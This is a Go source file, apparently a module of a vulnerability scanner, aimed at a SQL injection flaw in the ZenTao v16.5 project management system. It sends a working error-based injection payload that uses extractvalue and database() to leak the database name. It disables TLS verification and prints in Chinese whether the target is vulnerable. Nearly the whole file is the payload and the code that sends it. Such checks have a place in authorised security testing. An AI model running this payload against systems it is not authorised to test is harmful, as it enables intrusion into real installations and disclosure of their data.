package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func Zentao() {
	fmt.Println("\n-----------------------✂---------------------------")
	fmt.Println("禅道 v16.5 SQL注入漏洞 公开日期：2022/6/14")
	fmt.Println("\n-----------------------✂---------------------------")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{Transport: tr}
	//client := &http.Client{Timeout: time.Second * 10}
	req, err := http.NewRequest("POST", url+Zentaopath, strings.NewReader(
		`account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29%23`))
	if err != nil {
	}
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Referer", url+Zentaopath)
	resp, err := client.Do(req)
	if err != nil {
	}
	if err == nil {
		defer resp.Body.Close()
		body, err1 := ioutil.ReadAll(resp.Body)
		if err1 != nil {
			fmt.Println(err1)
		}
		if strings.Contains(string(body), "zentao") {
			fmt.Println("存在禅道 v16.5 SQL注入漏洞")
		} else {
			fmt.Println("不存在禅道 v16.5 SQL注入漏洞")
		}

	} else {
		fmt.Println("不存在禅道 v16.5 SQL注入漏洞")
	}

}
